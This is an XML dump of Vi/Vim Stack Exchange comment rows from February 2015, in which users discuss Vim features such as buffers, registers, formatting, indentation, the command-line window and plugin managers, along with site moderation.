  <row Id="566" PostId="504" Score="0" Text="`&lt;C-6&gt;` isn't bad but I can't use that to jump back two buffers. `bprev` and `bnext` are not in order of jumps." CreationDate="2015-02-06T09:40:43.010" UserId="268" />
  <row Id="567" PostId="90" Score="1" Text="@Carpetsmoker Strange; with most commands it doesn't matter in which order you give the prefixes and the numbers, as long as the command itself is last. Here it does not :-/" CreationDate="2015-02-06T09:50:28.210" UserId="82" />
  <row Id="568" PostId="504" Score="0" Text="Yea I don't think there's any good native way to go deeper into the history. You'd have to use some MRU plugin, even CtrlP has one, there must be others" CreationDate="2015-02-06T09:54:29.710" UserId="74" />
  <row Id="569" PostId="507" Score="0" Text="Well, that was certainly simpler than I would have expected :-)" CreationDate="2015-02-06T11:06:18.803" UserId="51" />
  <row Id="570" PostId="371" Score="0" Text="Yeah, this is a bit better. Didn't know you could do `set key=` to make Vim ask for the password again." CreationDate="2015-02-06T11:14:48.803" UserId="51" />
  <row Id="571" PostId="499" Score="2" Text="The [diffchar](http://www.vim.org/scripts/script.php?script_id=4932) plugin is probably what you need but I have zero experience with it. Maybe someone with experience using it can give a good, detailed answer (or maybe an alternative)." CreationDate="2015-02-06T11:30:04.443" UserId="20" />
  <row Id="572" PostId="474" Score="0" Text="Is your question about the python part or about how to interface the python code with vim? I agree with @Doorknob that &quot;how do I write a python snipped that does this&quot; is off topic and should be asked on SO. If you however know how to do this in pure python, but just don't get it to work with the vim api, that would be on topic but feels very broad. IMO you should instead focus on a specific part of the python&lt;-&gt;vim interfacing that you cant figure out (e.g. &quot;How do I replace the current line in vim from a python script&quot;)." CreationDate="2015-02-06T11:36:36.907" UserId="117" />
  <row Id="573" PostId="505" Score="4" Text="There is also [an answer on SO](http://stackoverflow.com/a/5144480/500942) which covers retabbing at start of line only. It is worth linking because of the clarity of that explanation." CreationDate="2015-02-06T11:41:12.597" UserId="182" />
  <row Id="574" PostId="510" Score="1" Text="So basically, you want to open a shell in a `:split`, while retaining the file in the other window? ... This sounds like a job for tmux or screen to me ..." CreationDate="2015-02-06T12:35:23.290" UserId="51" />
  <row Id="575" PostId="510" Score="1" Text="@Carpetsmoker: I often don't have control over what is installed on the remote system, and more often than not neither of the two is, while Vim is always there." CreationDate="2015-02-06T12:36:40.320" UserId="351" />
  <row Id="576" PostId="483" Score="0" Text="@Carpetsmoker You could save the file as a new file, and run a `diff` on them. But this isn't going to produce anywhere near reasonable results for source code and the like, of course." CreationDate="2015-02-06T12:46:34.500" UserId="88" />
  <row Id="577" PostId="483" Score="0" Text="@Oxinabox Yes, and as long as the macro is empty before this, the finished macro will repeatedly call itself until reaching EOF." CreationDate="2015-02-06T12:47:04.627" UserId="88" />
  <row Id="578" PostId="474" Score="0" Text="Note: The question is now closed with `marked as duplicate`, since more people voted on that. But I think `unclear what you're asking` would be better (I voted for that option)... You could make the question better, and ask for re-open!" CreationDate="2015-02-06T13:02:59.797" UserId="51" />
  <row Id="579" PostId="513" Score="1" Text="That's good for typing. Can I apply that for pre-existing text?" CreationDate="2015-02-06T13:03:16.770" UserId="351" />
  <row Id="581" PostId="511" Score="1" Text="gq/gw is definitely the way to go. to add to this message you can change format program to par to have more options. Checkout http://vimcasts.org/episodes/formatting-text-with-par/" CreationDate="2015-02-06T13:04:55.673" UserId="192" />
  <row Id="586" PostId="429" Score="0" Text="@Rich, thanks for the answer. While it is not a perfect solution (in term of highlighting blocks) it fully answers the question demonstrating that this is possible. Answer Accepted." CreationDate="2015-02-06T13:32:54.290" UserId="307" />
  <row Id="587" PostId="517" Score="0" Text="No way to do anything like this without a plugin?" CreationDate="2015-02-06T14:12:15.643" UserId="351" />
  <row Id="588" PostId="511" Score="2" Text="By default, Vim doesn't use any external program, although you can choose to use one by setting the `'formatprg'` option." CreationDate="2015-02-06T14:16:20.787" UserId="15" />
  <row Id="589" PostId="517" Score="3" Text="@SF See [`:help shell-window`](http://vimdoc.sourceforge.net/htmldoc/tips.html#shell-window). (Short answer: no.)" CreationDate="2015-02-06T14:24:10.250" UserId="205" />
  <row Id="590" PostId="362" Score="0" Text="Is there also a way to do this by default? So that `:help foo` would act as `:tab help foo`?" CreationDate="2015-02-06T14:44:06.203" UserId="51" />
  <row Id="591" PostId="362" Score="0" Text="@Carpetsmoker Yes, you could do something like `cnoremap help tab help`." CreationDate="2015-02-06T14:45:21.783" UserId="88" />
  <row Id="592" PostId="477" Score="0" Text="I did some more digging, and I don't think this is possible. `:changes` doesn't work without a lot of hackery; as it seems this information is stored in the viminfo file, and there's no way to see which changes you made this session, and which the previous one ... Unless you disable the viminfo file of course, but that's rather heavy handed ...  would like to be proven wrong here, though :-)" CreationDate="2015-02-06T14:50:03.143" UserId="51" />
  <row Id="593" PostId="222" Score="0" Text="@guido, I wonder if that depends on when you enable filetype detection? If you add that `autocmd` after `filetype on` (with or without the `plugin` / `indent` flags), I would guess the results are better. Not tested, just speculation." CreationDate="2015-02-06T15:00:50.767" UserId="64" />
  <row Id="594" PostId="474" Score="2" Text="Just in case this doesn't get reopened: http://paste.ubuntu.com/10093002/ - no comments, the code is fairly readable." CreationDate="2015-02-06T15:04:21.650" UserId="205" />
  <row Id="595" PostId="429" Score="0" Text="@Carpetsmoker I can also envisage some kind of horrible hacky script that adds in whitespace at the end of lines (and removes it again at opportune moments e.g. before save) but it would be horribly syntax-specific, and thinking about all the ways it could break makes my teeth hurt." CreationDate="2015-02-06T15:09:03.613" UserId="343" />
  <row Id="596" PostId="515" Score="4" Text="Might also be worth noting that the first two options can take a count to resize by more than one line/column at a time." CreationDate="2015-02-06T15:17:36.060" UserId="343" />
  <row Id="597" PostId="144" Score="1" Text="-1; This answer doesn't really have any bearing on the asked question. The question is about *reloading vimrc*, not *managing vimrc*." CreationDate="2015-02-06T15:30:31.650" UserId="51" />
  <row Id="598" PostId="144" Score="0" Text="The original question prior to my answer did not make it clear he was talking about instances on the same machine. At the time my answer did address the question." CreationDate="2015-02-06T15:34:09.980" UserId="41" />
  <row Id="599" PostId="527" Score="0" Text="Thank you, this is perfect.  I updated my mappings and it works flawlessly. `:&lt;C-F&gt;` for commands, `/&lt;C-F&gt;` and `?&lt;C-F&gt;` for search." CreationDate="2015-02-06T15:42:43.817" UserId="319" />
  <row Id="600" PostId="523" Score="0" Text="Thank you for your reply. I think the `%` is useful but not ideal in my case since the opening brackets and closing brackets of my structure are not on the same column and jumping around with the cursor causes the whole screen to change. I'm exploring folding at the moment to see if it could be useful, but I will ask about that in a separate post as I have encountered some problems with it (which I think could be solved)." CreationDate="2015-02-06T16:32:55.240" UserId="368" />
  <row Id="601" PostId="523" Score="0" Text="As for the feature I requested in my post, perhaps I should submit a feature request." CreationDate="2015-02-06T16:33:30.557" UserId="368" />
  <row Id="602" PostId="535" Score="0" Text="Thanks. That worked!" CreationDate="2015-02-06T17:05:38.517" UserId="368" />
  <row Id="603" PostId="540" Score="0" Text="I will try this plugin. I'm sure the extra features it provides will be useful since sometimes when writing code there are syntax errors. Thanks." CreationDate="2015-02-06T17:16:40.080" UserId="368" />
  <row Id="604" PostId="492" Score="2" Text="See also :help vimball for additional vimball-related commands (in vim 7 and up I think)." CreationDate="2015-02-06T17:30:11.773" UserId="72" />
  <row Id="605" PostId="533" Score="0" Text="Thanks for the answer. This seems to be reasonable. I thought maybe I was missing some modifiers, but /&lt;char&gt; is good enough." CreationDate="2015-02-06T17:31:45.863" UserId="307" />
  <row Id="608" PostId="543" Score="0" Text="I feel like this might be too opinion-oriented; there's no objective &quot;best&quot; and there are a lot of good options, each with their own pros and cons. Also the bit specifically about nested repositories brings the question more into the &quot;using git&quot; category and less about vim. Perhaps if you focused instead on a specific problem you had with vim or vim plugins while trying to store your configuration on github?" CreationDate="2015-02-06T18:20:00.797" UserId="72" />
  <row Id="609" PostId="543" Score="3" Text="I can edit it to take out the *best* if you like; my intention was to ask more of a &quot;how do I do this?&quot; question, while acknowledging that the way I was thinking about going about the problem might not be ideal." CreationDate="2015-02-06T18:21:38.460" UserId="163" />
  <row Id="610" PostId="543" Score="0" Text="That may help, but that may just make it a &quot;list of things&quot; question (there are, again, *lots* of different ways to do this effectively). There's currently a [topic on meta](http://meta.vi.stackexchange.com/questions/141/do-we-want-to-allow-questions-that-are-effectively-lists-of-things) about such questions if you'd like to contribute to the discussion about how we should treat this sort of question." CreationDate="2015-02-06T18:24:07.177" UserId="72" />
  <row Id="611" PostId="474" Score="0" Text="@muru Thank you, that's exactly what I was looking for. If this question were still open and you answered, I would upvote and accept." CreationDate="2015-02-06T18:27:03.337" UserId="130" />
  <row Id="612" PostId="543" Score="1" Text="Edited. I hope I've made it more clear that I'm asking &quot;how do I do this?&quot;" CreationDate="2015-02-06T18:29:00.863" UserId="163" />
  <row Id="613" PostId="413" Score="0" Text="Interesting idea. On OS X it looks like this is achievable by combining the Karabiner (formerly known as KeyRemap4MacBook) and Seil utilities from Takayama Fumihiko on pqrs.org." CreationDate="2015-02-06T18:43:36.467" UserId="67" />
  <row Id="614" PostId="489" Score="2" Text="This seems to work in the opposite direction from the request: it creates a header file from the .cpp file." CreationDate="2015-02-06T18:51:14.430" UserId="24" />
  <row Id="618" PostId="548" Score="0" Text="Thanks, that looks like just the sort of thing I was looking for!" CreationDate="2015-02-06T19:05:42.687" UserId="163" />
  <row Id="619" PostId="548" Score="0" Text="Ah, I didn't notice your answer had been posted, since I was editing mine for some time." CreationDate="2015-02-06T19:29:31.147" UserId="205" />
  <row Id="620" PostId="546" Score="1" Text="&quot;You can just add this line to your .vimrc...&quot; did you mean .gitignore?" CreationDate="2015-02-06T19:38:16.977" UserId="72" />
  <row Id="622" PostId="539" Score="0" Text="How do I use this to create &amp; maintain flowcharts?" CreationDate="2015-02-06T19:55:21.163" UserId="51" />
  <row Id="623" PostId="548" Score="0" Text="Thanks for the suggestion @Carpetsmoker!" CreationDate="2015-02-06T20:19:19.027" UserId="67" />
  <row Id="624" PostId="546" Score="0" Text="Yes I did. Thanks, I updated it." CreationDate="2015-02-06T20:23:41.163" UserId="226" />
  <row Id="625" PostId="539" Score="0" Text="Since it is geared toward drawing ASCII art it could lower the amount of pain when you have to refactor.  But @JoshPetrie is probably right that using dot would be better." CreationDate="2015-02-06T20:39:35.187" UserId="93" />
  <row Id="626" PostId="423" Score="2" Text="I like using the unicode character `▸` as it is slightly smaller than `&gt;`. Currently I see trailing white space by marking the eol (though I may try the above). My settings are: `set listchars=eol:¬,tab:▸\ ` and" CreationDate="2015-02-06T21:43:04.177" UserId="383" />
  <row Id="627" PostId="553" Score="0" Text="Welcome to Vi/Vim! Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail about how exactly the plugin addresses the question." CreationDate="2015-02-06T22:14:25.803" UserId="24" />
  <row Id="628" PostId="522" Score="1" Text="Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail about how exactly these plugins can benefit the user." CreationDate="2015-02-06T22:15:30.687" UserId="24" />
  <row Id="629" PostId="59" Score="2" Text="Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail about how exactly to use your recommended plugin to solve the problem." CreationDate="2015-02-06T22:17:27.003" UserId="24" />
  <row Id="630" PostId="539" Score="2" Text="Please read our [policy on plugin-recommendation answers](http://meta.vi.stackexchange.com/q/99/24) and add some detail. A specific example of how to configure the plugin (if necessary) and activate it would be helpful." CreationDate="2015-02-06T22:20:23.233" UserId="24" />
  <row Id="632" PostId="308" Score="0" Text="How would you characterize, in words, where you want the match to start and end?" CreationDate="2015-02-06T22:51:32.390" UserId="24" />
  <row Id="633" PostId="542" Score="0" Text="+1 interesting; I'll give it a shot" CreationDate="2015-02-06T22:58:03.697" UserId="188" />
  <row Id="634" PostId="381" Score="0" Text="Minor glitches aside (which can probably be fixed), this looks promising ... The one thing I can't get done is the wrapping of the 3rd column though :-/" CreationDate="2015-02-07T00:19:27.643" UserId="51" />
  <row Id="635" PostId="562" Score="4" Text="I suggest that you remove the last paragraph and post your existing solution as a self-answer. Someone may come along with a better answer." CreationDate="2015-02-07T00:20:55.987" UserId="24" />
  <row Id="636" PostId="392" Score="4" Text="Thanks; I've edited your answer a bit to add some practical usage information (it read a little bit like an ad before) ... One thing I wasn't able to do with vim-table-mode is the wrapping of the 3rd column  as in the example in my question ... Is this possible?" CreationDate="2015-02-07T00:46:03.077" UserId="51" />
  <row Id="637" PostId="563" Score="0" Text="These drawbbacks are also true for `:cnoremap abc &lt;do stuff&gt;`..." CreationDate="2015-02-07T02:08:27.827" UserId="51" />
  <row Id="638" PostId="565" Score="1" Text="I'm voting to close this as off-topic because it isn't really about Vim so much as about the English language. It might be on-topic on [english.se], but I would read their help center / ask on chat first." CreationDate="2015-02-07T02:14:30.717" UserId="88" />
  <row Id="640" PostId="565" Score="7" Text="@Doorknob The spelling of application names is often irregular, and doesn't&#xA;follow 'normal' English gammer rules on the subject. The correct answer is usually 'whatever the&#xA;author says is correct', see for example LaTeX, GnuPG, iOS, JavaScript, etc." CreationDate="2015-02-07T02:25:47.160" UserId="51" />
  <row Id="641" PostId="567" Score="0" Text="Turns out `gn` wraps for me. Now I have to figure out what enables it. Ok - this wraps even with `-u NONE`." CreationDate="2015-02-07T04:08:35.730" UserId="205" />
  <row Id="642" PostId="567" Score="0" Text="@muru Weird... it still doesn't wrap with `-u NONE` for me. What platform/version? I'm on Vim 7.4.52 on Ubuntu 14.04." CreationDate="2015-02-07T04:16:49.090" UserId="88" />
  <row Id="644" PostId="567" Score="0" Text="7.4 (included patches 1-580), Arch Linux. I'll test on a Ubuntu system. - Yep, doesn't wrap on Ubuntu." CreationDate="2015-02-07T04:17:56.137" UserId="205" />
  <row Id="645" PostId="567" Score="1" Text="@muru Hmm, interesting... I've edited another line into the question." CreationDate="2015-02-07T04:21:15.640" UserId="88" />
  <row Id="647" PostId="570" Score="3" Text="Possibly related: http://www.drbunsen.org/vim-croquet/" CreationDate="2015-02-07T05:15:53.140" UserId="142" />
  <row Id="648" PostId="392" Score="0" Text="@Carpetsmoker thanks for the edit. Well you can wrap it manually, there's no way to do that automatically." CreationDate="2015-02-07T05:47:32.120" UserId="74" />
  <row Id="649" PostId="562" Score="1" Text="can I have a copy of your script?" CreationDate="2015-02-07T06:08:32.963" UserId="395" />
  <row Id="651" PostId="567" Score="0" Text="What about `ggdgn`? Or `:%s/. ./gc`?" CreationDate="2015-02-07T10:21:57.843" UserId="54" />
  <row Id="652" PostId="565" Score="0" Text="The answer is too easy to find in the doc for that question to be of any use." CreationDate="2015-02-07T10:22:57.127" UserId="54" />
  <row Id="653" PostId="563" Score="1" Text="There's no delay when you do `ab&lt;any key&gt;`." CreationDate="2015-02-07T10:26:02.010" UserId="54" />
  <row Id="664" PostId="565" Score="1" Text="@romainl I didn't time it, but I think it took me 20 to 30 minutes to find&#xA;this answer ... Not the most difficult, but not very easy either. You need to&#xA;know where to look :-) ..." CreationDate="2015-02-07T14:01:01.697" UserId="51" />
  <row Id="666" PostId="308" Score="1" Text="I want the match to start as late as possible and end as early as possible, while still satisfying the pattern." CreationDate="2015-02-07T16:29:21.263" UserId="64" />
  <row Id="669" PostId="584" Score="5" Text="q: shows ex command history, and is useful, but is not a log of normal commands, like &quot;ad2tn (delete into register a until the second n)" CreationDate="2015-02-07T17:37:47.833" UserId="227" />
  <row Id="670" PostId="585" Score="0" Text="@Carpetsmoker what's an ex-parrot? A Vim in-joke?" CreationDate="2015-02-07T18:01:04.223" UserId="205" />
  <row Id="671" PostId="585" Score="0" Text="Oh, that's interesting. I did not mean to edit this post. I wonder if upvoting+accepting had something to do with that. Two servers got out of order somewhere or something." CreationDate="2015-02-07T18:05:56.317" UserId="130" />
  <row Id="672" PostId="585" Score="0" Text="@mixedmath I rolled back yet again, then. :D" CreationDate="2015-02-07T18:06:37.927" UserId="205" />
  <row Id="673" PostId="585" Score="3" Text="No, [it's a Monty Python reference](https://www.youtube.com/watch?v=npjOSLCR2hE) :-) I would have expected that all Python programmers are familiar with it, given that there are quite a few Monty Python references in Python documentation and such." CreationDate="2015-02-07T18:06:53.780" UserId="51" />
  <row Id="674" PostId="585" Score="0" Text="@Carpetsmoker I'm familiar with Monty Python (the movies, anyway) but not with that particular one. :D" CreationDate="2015-02-07T18:07:43.987" UserId="205" />
  <row Id="675" PostId="583" Score="0" Text="Whenever a friend wants to learn vim, I always refer them to vim adventures. +1" CreationDate="2015-02-07T18:11:50.877" UserId="306" />
  <row Id="676" PostId="586" Score="0" Text="Related: [Plugin for Vim](https://github.com/mattn/emmet-vim)." CreationDate="2015-02-07T18:19:46.887" UserId="205" />
  <row Id="677" PostId="581" Score="0" Text="Does this work with direcotires as well (like .vim/bundle/) for plugins?" CreationDate="2015-02-07T19:14:07.400" UserId="307" />
  <row Id="680" PostId="593" Score="1" Text="Thanks. I got convinced that it's not really that useful to use this approach as in such situation one can resort to `/{char}`. But I accepted your answer in place of the previous one because it answers the original question instead of saying why one should not do it." CreationDate="2015-02-07T20:51:08.383" UserId="307" />
  <row Id="681" PostId="593" Score="0" Text="@KarolisKoncevičius Thank you :)" CreationDate="2015-02-07T21:32:42.440" UserId="356" />
  <row Id="682" PostId="595" Score="2" Text="Actually, this can be done with the `gL` operator defined by lion.vim. This operator performs alignment by adding spaces to the right of the alignment character (instead of the left, as with the `gl` operator). The full command would then be `gLip:`." CreationDate="2015-02-07T21:53:34.183" UserId="64" />
  <row Id="686" PostId="598" Score="0" Text="About the indentation issue you can solve it by pasting with `]p` or `[p` rather than `p` or `P`. This way the block that you paste will be autoindented." CreationDate="2015-02-08T00:28:35.917" UserId="356" />
  <row Id="688" PostId="603" Score="0" Text="`gv` goes to the last visual selection, which in this case would be the paragraph that was deleted. What am I missing?" CreationDate="2015-02-08T01:36:11.977" UserId="210" />
  <row Id="690" PostId="587" Score="0" Text="Thanks! I'm using this as a starting point for poking into the source code. It looks like -w saves every single key press, not just normal-mode commands, but you are correct: it is the right direction!" CreationDate="2015-02-08T03:02:24.313" UserId="227" />
  <row Id="691" PostId="602" Score="1" Text="This is a link-only answer. Please provide more detail about how to use the plugin to accomplish the goal." CreationDate="2015-02-08T05:16:26.633" UserId="24" />
  <row Id="692" PostId="582" Score="0" Text="This question asks about how an intermediate user can master Vim, which is not quite the same as the linked question." CreationDate="2015-02-08T05:18:32.913" UserId="24" />
  <row Id="693" PostId="579" Score="0" Text="PEP8 says: *&quot;But most importantly: know when to be inconsistent -- sometimes the style guide just doesn't apply. [...] Some other good reasons to ignore a particular guideline: 1. When applying the guideline would make the code less readable, even for someone who is used to reading code that follows this PEP. [...]&quot;* ... PEP8 are guidelines only. The universe is complex. Code is complex. You can't make rules for every possible scenario, so this is why PEP8 are *guidelines*, and not *rules*. The whole point of Python is readability, and *especially* because of that ..." CreationDate="2015-02-08T05:39:31.633" UserId="51" />
  <row Id="694" PostId="579" Score="0" Text="... exceptions to PEP8 are sometimes required... Using an automated tool to &quot;fix&quot; the code style can't do these exceptions, and is a flawed concept ... If you want PEP8-compliant code, then type PEP8 compliant code, and when it makes sense, *make an exception*." CreationDate="2015-02-08T05:41:07.830" UserId="51" />
  <row Id="695" PostId="606" Score="1" Text="This is less than ideal, because this just changes how tabs are visualized in vim, if someone else were to open the file in a different editor it wouldn't look as good." CreationDate="2015-02-08T05:49:06.703" UserId="74" />
  <row Id="696" PostId="588" Score="0" Text="it looks it has already been answered here: http://superuser.com/questions/357571/customize-text-editor-and-terminal-to-use-non-monospaced-fonts-without-the-horri/357579#357579" CreationDate="2015-02-08T06:20:50.150" UserId="188" />
  <row Id="697" PostId="606" Score="1" Text="@DhruvaSagar How so? The result is exactly identical after the tabs-to-spaces conversion in step 4." CreationDate="2015-02-08T06:41:03.420" UserId="24" />
  <row Id="699" PostId="463" Score="1" Text="The content of your answer is all correct, but the way you're using the terminology is (to me) a bit confusing. I think you're interpreting the documentation slightly wrongly. `q:` doesn't open an Ex command-line. It opens the *command history window*, in which the current and previous Ex commands can be edited. The Ex command line is what you get when you press `:` in Normal mode." CreationDate="2015-02-08T09:05:56.953" UserId="343" />
  <row Id="700" PostId="463" Score="3" Text="FWIW I think the Vim documentation is a bit confused too, as in places it refers to all `:` commands as being 'Ex' commands. IMHO really only the commands that are actually available in Ex should be considered to be Ex commands." CreationDate="2015-02-08T09:08:21.410" UserId="343" />
  <row Id="701" PostId="13" Score="1" Text="If you could do everything that you could do from a normal keyboard, what about it was displeasing? (I can think of several answers to this, but it would help to know which one(s) you're actually implying)." CreationDate="2015-02-08T09:33:00.527" UserId="343" />
  <row Id="702" PostId="605" Score="1" Text="I haven't used cscope (didn't even know it existed!), but the documentation makes it sound like this is supposed to just work. Have you got `csto` set to zero? (the default)" CreationDate="2015-02-08T10:39:33.877" UserId="343" />
  <row Id="703" PostId="542" Score="2" Text="This is a very creative idea! I didn't know about `:folddoopen`, seems like a very useful command. I also wanted to offer that if using [fugitive.vim](https://github.com/tpope/vim-fugitive), you can more easily see the diff of your current buffer with the `:Gdiff` command." CreationDate="2015-02-08T12:19:06.470" UserId="64" />
  <row Id="704" PostId="606" Score="0" Text="Different editors visualize / deal with tabs differently." CreationDate="2015-02-08T12:34:38.170" UserId="74" />
  <row Id="705" PostId="218" Score="3" Text="Moreover, the Command window is set up so that the command on the cursor line is executed when you press `Enter`, and your cursor will land on a empty line when you first open the Command window, so simply pressing `Enter` will close it." CreationDate="2015-02-08T12:49:47.417" UserId="64" />
  <row Id="706" PostId="610" Score="5" Text="the non-plugin solution is very specific for the case..." CreationDate="2015-02-08T12:55:35.223" UserId="342" />
  <row Id="707" PostId="610" Score="1" Text="@elyashiv the idea is that you can use a similar technique for any function arguments. Basically, yank a word, visually select another word, paste, which Vim will yank the deleted character to the register, and then paste where you first yanked from." CreationDate="2015-02-08T12:57:56.957" UserId="246" />
  <row Id="709" PostId="605" Score="0" Text="I do: `set csto?` shows `cscopetagorder=0`" CreationDate="2015-02-08T14:21:53.790" UserId="227" />
  <row Id="710" PostId="617" Score="0" Text="That works perfectly, thank you! Is there any explanation as to why viml/vimscript expects `\` here and not a quoted string instead? Seems unusual to me." CreationDate="2015-02-08T14:43:00.343" UserId="91" />
  <row Id="711" PostId="617" Score="2" Text="@AndrewFerrier It looks like Vim is interpreting `&quot;` as a comment in this context, so the command you're really running is `setlocal equalprg=`." CreationDate="2015-02-08T14:45:55.927" UserId="88" />
  <row Id="712" PostId="617" Score="0" Text="OK, that makes some sense. Thanks." CreationDate="2015-02-08T14:49:36.403" UserId="91" />
  <row Id="713" PostId="606" Score="0" Text="hmm ok, I guess I overlooked step #4. Sorry for that, my mistake." CreationDate="2015-02-08T14:58:14.040" UserId="74" />
  <row Id="716" PostId="582" Score="0" Text="@200_success The question is much too broad; it talks about buffers, registers, splits, visual mode, etc..." CreationDate="2015-02-08T16:41:08.520" UserId="51" />
  <row Id="717" PostId="615" Score="1" Text="Note: pathogen is *not* a plugin manager." CreationDate="2015-02-08T17:48:12.730" UserId="54" />
  <row Id="718" PostId="612" Score="0" Text="This is nice, but not for me, since I don't like using `=` (it often changes too much unrelated formatting for me)." CreationDate="2015-02-08T21:16:08.163" UserId="51" />
  <row Id="719" PostId="588" Score="0" Text="@guido I don't see an answer there ... The most upvoted answer is just an&#xA;explanation of what fonts are (not an answer), and the other &quot;answers&quot; are even worse..." CreationDate="2015-02-08T21:39:22.053" UserId="51" />
  <row Id="720" PostId="621" Score="0" Text="What do you mean exactly with 'between sessons'? That you have 2 Vim processes open next to each other, and want to share registers somehow? Or that you want your registers from the previous (now closed) Vim process? ... Also, I am not an alien! I AM A HUMAN EARTH MONKEY LIKE YOU! hehe ;-)" CreationDate="2015-02-08T21:57:25.240" UserId="51" />
  <row Id="721" PostId="621" Score="0" Text="The use case would be:&#xA;I have two files open in VIM.&#xA;I have a configuration block I need to copy from one to the other.&#xA;I dont necessarily need to close the first buffer.&#xA;I simply need the lines of text to be copied to a global space where I can then paste it to the second buffer. also, what's a squeedlyspooch?" CreationDate="2015-02-08T23:13:23.323" UserId="416" />
  <row Id="722" PostId="622" Score="0" Text="So, I would define a &quot;clipboard&quot; of sorts which VIM knows about in my dot file. I could alias a command to copy text to the &quot;clipboard&quot;, then globally I would have access to the text?" CreationDate="2015-02-08T23:19:36.123" UserId="416" />
  <row Id="723" PostId="626" Score="0" Text="Also handles up to 4 buffers, making it great for comparing configuration files" CreationDate="2015-02-08T23:27:07.060" UserId="238" />
  <row Id="726" PostId="622" Score="0" Text="@EricSabelhaus As long as your .viminfo is set up properly (just create an empty file called .viminfo in your `~` and Vim will do the rest), you can simply use `y` in one session of Vim, quit, and then `p` in another session later. (Of course, if you have two buffers open in the same Vim session, no .viminfo is necessary, simply yank some text, switch to your other buffer, and paste it there.)" CreationDate="2015-02-08T23:40:18.487" UserId="88" />
  <row Id="727" PostId="628" Score="3" Text="... I'd like to know who thought of the function name `insane_in_the_membrane`, and how that has remotely anything to do with its actual code. Because that person is brilliant and this is the best function name I've seen today! :P" CreationDate="2015-02-08T23:43:32.867" UserId="88" />
  <row Id="728" PostId="622" Score="0" Text="Fantastic! will this also work when coping using visual mode?" CreationDate="2015-02-09T01:56:49.123" UserId="416" />
  <row Id="729" PostId="622" Score="0" Text="Also, was this implemented recently? I vaguely remember trying to get this working about 2-3 months ago and pulling my hair out" CreationDate="2015-02-09T01:57:33.820" UserId="416" />
  <row Id="730" PostId="622" Score="0" Text=":( welp, part way answered the question... let me edit the question to be more specific." CreationDate="2015-02-09T02:02:38.410" UserId="416" />
  <row Id="731" PostId="622" Score="0" Text="@EricSabelhaus If you're starting the Vim process one after the other, why not just use the same Vim (ex. `vim file1.txt file2.txt`) and yank some lines (`Vjjj...y`), `:bn`, and `p`?" CreationDate="2015-02-09T02:12:27.650" UserId="88" />
  <row Id="732" PostId="636" Score="0" Text="I think the correct answer is almost certainly an autocommand based on the gitcommit filetype. I'll post it if I can come up with one myself." CreationDate="2015-02-09T02:19:36.203" UserId="390" />
  <row Id="733" PostId="636" Score="0" Text="Hmm, I can't reproduce your issue? I set the formatoptions to `caq1njwtl`, do `git commit`, and hit i (for insert mode), type `do` and hit enter ... Am I doing it right? ... I can't get the gitcommit filetype to apply auto-indent no matter what I do ... There isn't even an `indent/git*.vim` file on my system?" CreationDate="2015-02-09T02:22:56.317" UserId="51" />
  <row Id="734" PostId="636" Score="2" Text="While you're typing a commit message, if you try typing `:set ft?` and hitting enter, what is the output?" CreationDate="2015-02-09T02:24:50.047" UserId="88" />
  <row Id="735" PostId="631" Score="0" Text="@Carpetsmoker &quot;DIRECTORY EXPLORATION COMMANDS&quot;  =o_0=" CreationDate="2015-02-09T02:38:54.760" UserId="238" />
  <row Id="737" PostId="621" Score="1" Text="You could yank the stuff to the system clipboard by using `&quot;+y` and paste it into which ever other application (vim included) you want." CreationDate="2015-02-09T04:13:29.997" UserId="224" />
  <row Id="738" PostId="636" Score="0" Text="It's `gitcommit`. I solved it. Posting answer now." CreationDate="2015-02-09T07:35:02.637" UserId="390" />
  <row Id="739" PostId="648" Score="1" Text="`smartindent` is something you only want to enable in C, and maybe a few languages with a syntax that's very similar... I think it's a leftover from before Vim had indent files for different languages." CreationDate="2015-02-09T07:52:10.187" UserId="51" />
  <row Id="740" PostId="636" Score="0" Text="@Carpetsmoker Yeah, my `.vimrc` is 1703 lines and 52K in size at present. I'm not surprised at all that this isn't reproduced with vanilla vim." CreationDate="2015-02-09T07:59:31.403" UserId="390" />
  <row Id="741" PostId="648" Score="0" Text="Yeah maybe I will test with smartindent removed from my configuration and enabling it only for specific C-style filetypes (and javascript, etc). I already have an autocmd for Python that disables it as well, which was put in place for reasons quickly becoming obvious." CreationDate="2015-02-09T08:01:18.453" UserId="390" />
  <row Id="742" PostId="620" Score="0" Text="Thank you for this great answer! `:)`" CreationDate="2015-02-09T08:41:23.060" UserId="106" />
  <row Id="743" PostId="199" Score="0" Text="Great answer! `:)` Sadly, every time we want to solve a problem with regex, we end up with two problems. `:)`" CreationDate="2015-02-09T09:48:15.787" UserId="106" />
  <row Id="744" PostId="628" Score="0" Text="@Doorknob Function was [renamed from &quot;start&quot; to &quot;insane in the membrane&quot;](https://github.com/mhinz/vim-startify/commit/c91cfb29aef9539987fbc438640633ba534d24a9) by Marco Hinz. Given [the original lyrics by Cypress Hill](http://www.lyricsmode.com/lyrics/c/cypress_hill/insane_in_the_brain.html) I'd guess he was worried about how big the method was getting. Or maybe was just listening to it at the time." CreationDate="2015-02-09T09:59:12.220" UserId="182" />
  <row Id="746" PostId="390" Score="1" Text="[vim-pandemic](https://github.com/jwcxz/vim-pandemic) is a nice addition to Pathogen. It handles the remote repositories behind the plugins, leaving Pathogen to handle the runtimepath. This does mean one needs two tools, but for disparate tasks which &quot;should&quot; be handled separately. The advantage of Pathogen + Pandemic that I found most convincing: there's no need to deal with git sub-modules for the bundles." CreationDate="2015-02-09T10:23:00.113" UserId="182" />
  <row Id="747" PostId="390" Score="0" Text="@jalanb Nice! I'll look into this an update when I can." CreationDate="2015-02-09T10:37:20.513" UserId="205" />
  <row Id="748" PostId="550" Score="0" Text="[vim-pandemic](https://github.com/jwcxz/vim-pandemic) is another way to enhance Pathogen without needing to use submodules. Pandemic handles the remote repositories leaving Pathogen to handle the runtimepath. This does mean one needs two tools, but for disparate tasks which &quot;should&quot; be handled separately." CreationDate="2015-02-09T10:43:01.287" UserId="182" />
  <row Id="750" PostId="581" Score="0" Text="Yes, it does. Although I recommend a plugin manager to manage your plugins." CreationDate="2015-02-09T11:07:13.357" UserId="153" />
  <row Id="751" PostId="549" Score="2" Text="`:t` is the copy command. For `:tabedit` you need at least `:tabe`." CreationDate="2015-02-09T11:19:42.520" UserId="64" />
